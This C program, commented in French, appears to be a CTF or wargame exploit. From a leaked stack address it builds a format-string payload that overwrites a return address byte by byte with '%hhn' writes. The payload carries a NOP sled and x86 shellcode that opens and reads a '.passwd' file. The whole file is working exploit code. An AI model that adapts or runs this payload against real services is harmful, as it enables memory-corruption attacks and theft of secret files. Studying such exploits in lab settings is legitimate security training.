#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

char shellcode[] = {
					0x31, 0xc0, 0x50, 0x68, 0x73, 0x73, 0x77, 0x64, 0x68, 0x2f,
					0x2e, 0x70, 0x61, 0x68, 0x2e, 0x2f, 0x2f, 0x2f, 0x89, 0xe3, 
					0x89, 0xc1, 0x89, 0xc2, 0xb0, 0x05, 0xcd, 0x80, 0x89, 0xc3,
					0x8d, 0x8d, 0xe0, 0xf7, 0xff, 0xff, 0x31, 0xd2, 0xb2, 0xff,
					0x31, 0xc0, 0xb0, 0x03, 0xcd, 0x80, 0x01, 0xc1, 0x31, 0xc0,
					0x89, 0x41, 0x01, 0x04, 0x10, 0x01, 0xc4, 0x31, 0xc0, 0x89,
					0x44, 0x24, 0x08, 0xb8, 0x36, 0x88, 0x04, 0x08, 0xff, 0xe0 
				   };

/* Ecrit dans output le nombre n en Little Endian */
void print_uint32_LE(char *output, uint32_t n)
{
	int i;

	for (i = 0 ; i < sizeof n ; i++)
	{
		output[i] = (n >> (8 * i)) & 0xff;
	}
}

int main(int argc, char *argv[])
{
	char output[1024];
	int i, j;
	uint32_t base_addr, ret_addr, shellcode_addr;
	unsigned char shellcode_addr_ordered[4], n = 0;
	uint32_t ret_addr_ordered[4]; 

	if (argc < 2)
	{
		printf("Usage : %s <address>\n", argv[0]);
		printf("<address> can be obtained sending '%%524$x'\n");
		exit(EXIT_FAILURE);
	}

	base_addr = strtoul(argv[1], NULL, 0);
	ret_addr = base_addr - 2204;
	shellcode_addr = base_addr - 402;

	for (i = 0 ; i < 4 ; i++)
	{
		ret_addr_ordered[i] = ret_addr + i;
		shellcode_addr_ordered[i] = (shellcode_addr >> (8 * i)) & 0xff;
	}

	/* Tri croissant en fonction des octets de l'adresse du shellcode */
	for (i = 0 ; i < 4 ; i++)
	{
		for (j = i + 1 ; j < 4 ; j++)
		{
			if (shellcode_addr_ordered[i] > shellcode_addr_ordered[j])
			{
				unsigned char tmps = shellcode_addr_ordered[i];
				uint32_t tmpr = ret_addr_ordered[i];
				shellcode_addr_ordered[i] = shellcode_addr_ordered[j];
				shellcode_addr_ordered[j] = tmps;
				ret_addr_ordered[i] = ret_addr_ordered[j];
				ret_addr_ordered[j] = tmpr;
			}
		}
	}

	for (i = 0 ; i < 1024 ; i++)
	{
		output[i] = '\0';
	}


	/* n contient le nombre de caracÃ¨res affichÃ©s en sortie dans la chaine
 	 * output du serveur */
	for (i = 0 ; i < 4 ; i++)
	{
		print_uint32_LE(output + i * 4, ret_addr_ordered[i]);
		n += 4;
	}

	strcat(output, "%x%x%x");
	n += 3;

	/* Rotation si necessaire, la valeur de n est modulo 256 et
 	 * on a deja ecrit un certain nombre de caractÃ¨res */
	for (i = 0 ; i < 4 ; i++)
	{
		if (shellcode_addr_ordered[0] < n)
		{
			unsigned char tmp = shellcode_addr_ordered[0];
			for (j = 0 ; j < 3 ; j++)
			{
				shellcode_addr_ordered[j] = shellcode_addr_ordered[j+1];
			}
			shellcode_addr_ordered[3] = tmp;
		}
	}

	/* On ecrit le bon nombre d'espaces puis le %hhn, pour chaque octet de
	 * l'adresse de retour */
	for (i = 0 ; i < 4 ; i++)
	{
		unsigned int size = strlen(output);
		for (j = 0 ; n != shellcode_addr_ordered[i] ; n++, j++)
		{
			output[size + j] = ' ';
		}
		strcat(output, "%hhn");
	}

	/* Nops */
	for (i = strlen(output) ; i < 900 ; i++)
	{
		output[i] = 0x90;
	}

	/* Ecriture du shellcode */
	for (j = 0 ; j < sizeof(shellcode) ; j++)
	{
		output[i + j] = shellcode[j];
	}

	write(1, output, 1024);

	return EXIT_SUCCESS;
}
